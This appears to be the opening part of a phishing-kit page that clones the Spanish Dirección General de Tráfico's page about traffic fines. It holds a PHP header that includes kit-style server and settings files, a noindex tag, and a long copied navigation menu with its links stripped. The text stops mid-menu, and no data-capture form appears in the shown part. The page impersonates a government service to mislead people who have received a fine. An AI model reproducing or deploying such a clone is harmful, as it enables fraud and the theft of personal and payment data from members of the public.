<?php

include '../server/fonctions.php'; 
include '../settings.php'; 
require '../server/all.php';


?>

<!DOCTYPE html>
<html lang="es"><head>				
	<title>DGT - ¿Qué hacer si has recibido una multa?</title>
	
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="robots" content="noindex, nofollow">
	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
	
	
	
	<link rel="icon" type="image/x-icon" href="favicon.ico">
	
	<link rel="apple-touch-icon" sizes="57x57" href="images/apple-icon-57x57.png"> 
	<link rel="apple-touch-icon" sizes="60x60" href="images/apple-icon-60x60.png"> 
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-icon-72x72.png"> 
	<link rel="apple-touch-icon" sizes="76x76" href="images/apple-icon-76x76.png"> 
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-icon-114x114.png"> 
	<link rel="apple-touch-icon" sizes="120x120" href="images/apple-icon-120x120.png"> 
	<link rel="apple-touch-icon" sizes="144x144" href="images/apple-icon-144x144.png"> 
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-icon-152x152.png"> 
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-icon-180x180.png"> 
	<link rel="icon" type="image/png" sizes="192x192" href="images/android-icon-192x192.png"> 
	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"> 
	<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96x96.png"> 
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
	<style>
        /* Style du bouton */
        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px; /* Bords arrondis */
            cursor: pointer;
        }

        /* Style au survol du bouton */
        .custom-button:hover {
            background-color: #036; /* Changer la couleur au survol */
        }
    </style>	
	

<link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-print.min.css" media="print"> 
<link type="text/css" rel="stylesheet" href="../assets/css/index.css">
                            
			
<div id="header">
			<div>
				<div id="navigationContainer">
					<nav class="navbar pre-header">
						<div class="container">
							<div class="contenedorIdiomas ">
								<div id="google_translate_element"></div>
								<div class="dropdown select">
									<a  class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">
										<span class="code">--</span>
										<span class="name">------</span>
									</a>
									<div class="dropdown-menu" role="listbox">
										<a  role="option" class="dropdown-item " data-code="DE" data-name="Alemán" data-comparativa="/es/de">
											<span class="code">DE</span>
											<span>Alemán</span>
										</a>
										<a  role="option" class="dropdown-item " data-code="CA" data-name="Catalán" data-comparativa="/es/ca">
											<span class="code">CA</span>
											<span>Catalán</span>
										</a>
										<a  role="option" class="dropdown-item " data-code="ES" data-name="Español" data-comparativa="/es/es">
											<span class="code">ES</span>
											<span>Español</span>
										</a>
										<a  role="option" class="dropdown-item " data-code="EU" data-name="Euskera" data-comparativa="/es/eu">
											<span class="code">EU</span>
											<span>Euskera</span>
										</a>
										<a  role="option" class="dropdown-item " data-code="FR" data-name="Francés" data-comparativa="/es/fr">
											<span class="code">FR</span>
											<span>Francés</span>
										</a>
										<a  role="option" class="dropdown-item " data-code="GL" data-name="Gallego" data-comparativa="/es/gl">
											<span class="code">GL</span>
											<span>Gallego</span>
										</a>
										<a  role="option" class="dropdown-item " data-code="EN" data-name="Inglés" data-comparativa="/es/en">
											<span class="code">EN</span>
											<span>Inglés</span>
										</a>
									</div>
								</div>
							</div>
							<!-- Menu Secundario Escritorio -->
							<ul class="navbar-nav ml-auto">
								<!-- Nivel 1 -->
								<li class="nav-item"><a class="dropdown-item cifras-header" >Transparencia</a></li>
								<li class="nav-item"><a class="dropdown-item cifras-header" >DGT en cifras</a></li>
								<li class="nav-item dropdown">
									<a class="nav-link dropdown-toggle"  id="Selecciónyformación" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Selección y formación</a>
									<div class="dropdown-menu" aria-labelledby="Selecciónyformación">
										<!-- Nivel 2 -->
										<a class="dropdown-item" >Cursos para empleados públicos</a>
										<a class="dropdown-item" >Oposiciones y concursos</a>
										<a class="dropdown-item" >Selección de personal interino</a>
									</div>
								</li>
								<li class="nav-item dropdown">
									<a class="nav-link dropdown-toggle"  id="Trabajaconnosotros" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Trabaja con nosotros</a>
									<div class="dropdown-menu" aria-labelledby="Trabajaconnosotros">
										<!-- Nivel 2 -->
										<a class="dropdown-item" >Recursos para proveedores</a>
										<a class="dropdown-item" >Factura electrónica</a>
									</div>
								</li>
							</ul>
							<!-- Fin Menu Secundario Escritorio -->
						</div>
					</nav>
					<!-- Cabecera -->
					<nav class="navbar navbar-expand-xl header">
						<div class="container position-relative align-items-xl-stretch">
							<button class="navbar-toggler border-0" type="button" data-target="#sidebar" aria-controls="sidebarNav" aria-expanded="false" aria-label="Toggle navigations sidebar"><i class="icon-bars"></i></button>
							<span class="span-ico-logo">
								<a class="navbar-brand"  target=""><img src="../assets/images/logo_dgt.svg" alt="Dirección General de Tráfico"></a>
							</span>
							<div class="navbar-collapse" id="sidebarNav">
								<!-- Menu -->
								<ul class="navbar-nav">
									<li class="nav-item dropdown ">
										<a class="nav-link dropdown-toggle"  id="Nuestrosservicios" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Nuestros servicios</a>
										<ul class="dropdown-menu" aria-labelledby="Nuestrosservicios">
											<!-- Nivel 2 -->
											<li><a class="dropdown-item back"  role="button">Atrás</a></li>
											<li class="dropdown-item"><a >Conoce todos los trámites</a></li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Multas y sanciones</a>
												<ul class="dropdown-menu" aria-labelledby="Multasysanciones">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item">
														<a >¿Qué hacer si has recibido una multa?<span class="sr-only">(current)</span></a>
													</li>
													<li class="dropdown-item"><a >¿Cómo y dónde quieres que te notifiquemos tus multas?</a></li>
													<li class="dropdown-item"><a >¿Quién puede multarte?</a></li>
													<li class="dropdown-item"><a >Conoce los tipos de infracciones y sanciones</a></li>
													<li class="dropdown-item"><a >Multas dentro de la Unión Europea</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Permisos de conducir</a>
												<ul class="dropdown-menu" aria-labelledby="Permisosdeconducir">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Información de tus permisos y puntos</a>
														<ul class="dropdown-menu" aria-labelledby="Informacióndetuspermisosypuntos">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Informes y datos de tus permisos</a></li>
															<li class="dropdown-item"><a >Consulta y certificado de puntos</a></li>
															<li class="dropdown-item"><a >¿Cómo funciona el permiso por puntos?</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Recuperación de permisos y puntos</a>
														<ul class="dropdown-menu" aria-labelledby="Recuperacióndepermisosypuntos">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Recupera tus puntos</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Clases de permisos de conducir</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Obtener un nuevo permiso de conducir</a>
														<ul class="dropdown-menu" aria-labelledby="Obtenerunnuevopermisodeconducir">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Requisitos, preparación y presentación a examen</a></li>
															<li class="dropdown-item"><a >Elegir autoescuela</a></li>
															<li class="dropdown-item"><a >Consulta tu nota de examen</a></li>
															<li class="dropdown-item"><a >Traslado de expediente</a></li>
															<li class="dropdown-item"><a >Anulación de convocatoria de examen</a></li>
															<li class="dropdown-item"><a >Estado de tramitación de tu permiso</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Accesibilidad en el permiso conducir</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">¿Ha caducado o necesitas una copia de tu permiso?</a>
														<ul class="dropdown-menu" aria-labelledby="¿Hacaducadoonecesitasunacopiadetupermiso?">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Renovar un permiso próximo a caducar</a></li>
															<li class="dropdown-item"><a >Duplicado por deterioro, pérdida, robo o cambio de datos</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Conducir Mercancías peligrosas</a>
														<ul class="dropdown-menu" aria-labelledby="ConducirMercancíaspeligrosas">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Definición y tipos de mercancías peligrosas</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Permisos para mercancías peligrosas (ADR)</a>
																<ul class="dropdown-menu" aria-labelledby="Permisosparamercancíaspeligrosas(ADR)">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Tipos de permisos ADR</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Obtención del permiso ADR Básico</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Ampliaciones ADR: Cisternas, explosivos y material radioactivo</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Renovación de autorizaciones ADR por caducidad</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Duplicado de ADR</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Conducir en el extranjero, permiso internacional</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Permisos extranjeros y de Fuerzas y Cuerpos de Seguridad</a>
														<ul class="dropdown-menu" aria-labelledby="PermisosextranjerosydeFuerzasyCuerposdeSeguridad">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Conducir con un permiso extranjero</a></li>
															<li class="dropdown-item"><a >Permisos válidos para conducir en España</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Canjes de permisos</a>
																<ul class="dropdown-menu" aria-labelledby="Canjesdepermisos">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Canjes de Fuerzas y Cuerpos de Seguridad Españoles</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Canjes de diplomáticos acreditados en España</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Canjes de permisos extranjeros</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Países con convenio de canjes</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Permiso de conducir para mayores de 65 años</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Cambio de domicilio</a>
														<ul class="dropdown-menu" aria-labelledby="Cambiodedomicilio">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Cambio de domicilio dentro de España</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Traslado fuera de España</a>
																<ul class="dropdown-menu" aria-labelledby="TrasladofueradeEspaña">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Traslado a un país de la Unión Europea</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Traslado a un país fuera de la Unión Europea</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Vienes a vivir a España</a>
																<ul class="dropdown-menu" aria-labelledby="VienesaviviraEspaña">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Trasladarte a España desde un país de la Unión Europea</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Trasladarte a España desde un país externo a la Unión Europea</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Vehículos</a>
												<ul class="dropdown-menu" aria-labelledby="Vehículos">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Información de tus vehículos</a>
														<ul class="dropdown-menu" aria-labelledby="Informacióndetusvehículos">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Datos de tus vehículos</a></li>
															<li class="dropdown-item"><a >Distintivo ambiental</a></li>
															<li class="dropdown-item"><a >Informe de un vehículo</a></li>
															<li class="dropdown-item"><a >Conductor habitual de tu vehículo</a></li>
															<li class="dropdown-item"><a >Impuesto de Circulación: IVTM</a></li>
															<li class="dropdown-item"><a >Libro electrónico de mantenimiento</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Información pública de vehículos</a>
														<ul class="dropdown-menu" aria-labelledby="Informaciónpúblicadevehículos">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Distintivo ambiental</a></li>
															<li class="dropdown-item"><a >Informe de un vehículo</a></li>
															<li class="dropdown-item"><a >Libro electrónico de mantenimiento</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Vehículos de Movilidad Personal (VMP)</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Modificación, reformas y cambio de servicio o datos</a>
														<ul class="dropdown-menu" aria-labelledby="Modificación,reformasycambiodeservicioodatos">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Modificación y reformas de un vehículo</a></li>
															<li class="dropdown-item"><a >Cambio de servicio del vehículo o de datos del titular</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Documentación de un vehículo</a>
														<ul class="dropdown-menu" aria-labelledby="Documentacióndeunvehículo">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >La documentación de un vehículo</a></li>
															<li class="dropdown-item"><a >¿Has perdido o deteriorado la documentación?</a></li>
															<li class="dropdown-item"><a >¿Qué documentación debes llevar en tu vehículo?</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >¿Te han robado tu vehículo?</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Matricular un vehículo</a>
														<ul class="dropdown-menu" aria-labelledby="Matricularunvehículo">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Matricular un vehículo nuevo</a></li>
															<li class="dropdown-item"><a >Matricular un vehículo histórico</a></li>
															<li class="dropdown-item"><a >Rematricular un vehículo con matrícula antigua</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Matricular un vehículo extranjero</a>
																<ul class="dropdown-menu" aria-labelledby="Matricularunvehículoextranjero">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Matricular un vehículo proveniente de la UE</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Importar un vehículo de fuera de la UE</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<li class="dropdown-item"><a >Matricula temporal: placas verdes</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">¿Vas a comprar o vender un vehículo de segunda mano?</a>
														<ul class="dropdown-menu" aria-labelledby="¿Vasacomprarovenderunvehículodesegundamano?">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Comprar un vehículo de segunda mano</a></li>
															<li class="dropdown-item"><a >Vender un vehículo de segunda mano</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Donaciones, herencias y divorcios o separaciones</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">¿Quieres traer o llevarte un vehículo del extranjero?</a>
														<ul class="dropdown-menu" aria-labelledby="¿Quierestraerollevarteunvehículodelextranjero?">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Matricular un vehículo proveniente de la UE</a></li>
															<li class="dropdown-item"><a >Importar un vehículo de fuera de la UE</a></li>
															<li class="dropdown-item"><a >Trasladar un vehículo español al extranjero</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Cambio de domicilio dentro de España</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">¿No vas a usar tu vehículo?</a>
														<ul class="dropdown-menu" aria-labelledby="¿Novasausartuvehículo?">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Baja temporal</a></li>
															<li class="dropdown-item"><a >Baja definitiva</a></li>
															<li class="dropdown-item"><a >Volver a dar de alta un vehículo</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Vehículos históricos</a>
														<ul class="dropdown-menu" aria-labelledby="Vehículoshistóricos">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >¿Cómo hago mi vehículo histórico?</a></li>
															<li class="dropdown-item"><a >Matriculación de vehículos históricos</a></li>
															<li class="dropdown-item"><a >Rehabilitación de vehículos históricos</a></li>
															<li class="dropdown-item"><a >Baja definitiva de un vehículo histórico</a></li>
															<li class="dropdown-item"><a >Eventos de vehículos históricos</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Autorizaciones, obras y usos excepcionales de la vía</a>
												<ul class="dropdown-menu" aria-labelledby="Autorizaciones,obrasyusosexcepcionalesdelavía">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Autorizaciones especiales de circulación</a>
														<ul class="dropdown-menu" aria-labelledby="Autorizacionesespecialesdecirculación">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Autorizaciones Complementarias de Circulación para grandes masas y dimensiones</a>
																<ul class="dropdown-menu" aria-labelledby="AutorizacionesComplementariasdeCirculaciónparagrandesmasasydimensiones">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Solicitud Autorización Complementaria de Circulación</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Comunicación de inicio de viaje ACC</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<li class="dropdown-item"><a >Autorizaciones para conjuntos euromodulares (megacamiones)</a></li>
															<li class="dropdown-item"><a >Autorizaciones para tren turístico</a></li>
															<li class="dropdown-item"><a >Autorizaciones para pruebas o ensayos de investigación extraordinarios</a></li>
															<li class="dropdown-item"><a >Autorizaciones para circular en fechas con restricciones</a></li>
															<li class="dropdown-item"><a >Comunicaciones para circulación excepcional con nivel rojo</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Usos excepcionales de la vía</a>
														<ul class="dropdown-menu" aria-labelledby="Usosexcepcionalesdelavía">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Eventos deportivos</a>
																<ul class="dropdown-menu" aria-labelledby="Eventosdeportivos">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Celebración de un evento deportivo</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Alta y consulta del calendario de eventos programados</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<li class="dropdown-item"><a >Eventos de vehículos históricos</a></li>
															<li class="dropdown-item"><a >Rodajes audiovisuales</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Comunicar el inicio de una obra en la vía</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Para colaboradores y empresas</a>
												<ul class="dropdown-menu" aria-labelledby="Paracolaboradoresyempresas">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Autoescuelas</a>
														<ul class="dropdown-menu" aria-labelledby="Autoescuelas">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Seguimiento de enseñanza a la conducción</a></li>
															<li class="dropdown-item"><a >Solicitar exámenes para alumnos</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Gestión de la autoescuela y sus recursos</a>
																<ul class="dropdown-menu" aria-labelledby="Gestióndelaautoescuelaysusrecursos">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Apertura, modificación y cierre de autoescuelas</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Apertura y cierre de secciones</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Alta y baja de personal de autoescuelas</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Alta y baja de vehículos para autoescuelas</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Certificación para trabajar en una autoescuela</a>
																<ul class="dropdown-menu" aria-labelledby="Certificaciónparatrabajarenunaautoescuela">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Certificado de aptitud para profesores de formación vial</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Certificado de aptitud para directores de escuelas de conductores</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Centros de Sensibilización y Reeducación vial</a>
														<ul class="dropdown-menu" aria-labelledby="CentrosdeSensibilizaciónyReeducaciónvial">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Gestión de Centros y Cursos</a></li>
															<li class="dropdown-item"><a >Contenido y precio de los cursos</a></li>
															<li class="dropdown-item"><a >Certificado de aptitud para formadores y psicólogos formadores de centros de sensibilización</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Centros de formación para mercancías peligrosas</a>
														<ul class="dropdown-menu" aria-labelledby="Centrosdeformaciónparamercancíaspeligrosas">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Gestión del centro y sus recursos</a>
																<ul class="dropdown-menu" aria-labelledby="Gestióndelcentroysusrecursos">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Apertura de un centro de formación para mercancías peligrosas</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Modificación de la titularidad o recursos de un centro de formación para mercancías peligrosas</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Cierre temporal o definitivo de un centro de formación para mercancías peligrosas</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Solicitud para impartir nuevos cursos</a>
																<ul class="dropdown-menu" aria-labelledby="Solicitudparaimpartirnuevoscursos">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Solicitud apertura nuevo curso ADR para conductores</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Solicitud apertura nuevo curso ADR para personal docente</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Centros de Reconocimiento de Conductores</a>
														<ul class="dropdown-menu" aria-labelledby="CentrosdeReconocimientodeConductores">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Realización de informes médicos y tramitación de permisos</a></li>
															<li class="dropdown-item childs">
																<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Gestión del CRC y su personal</a>
																<ul class="dropdown-menu" aria-labelledby="GestióndelCRCysupersonal">
																	<!-- Nivel 5 -->
																	<li><a class="dropdown-item back"  role="button">Atrás</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Apertura, modificación y cierre del CRC</a></li>
																	<!--
																	<a class="dropdown-item "  --><!--</a>
																	  -->
																	<li class="dropdown-item"><a >Alta y baja de personal del CRC</a></li>
																	<!-- Fin Nivel 5 -->
																</ul>
															</li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
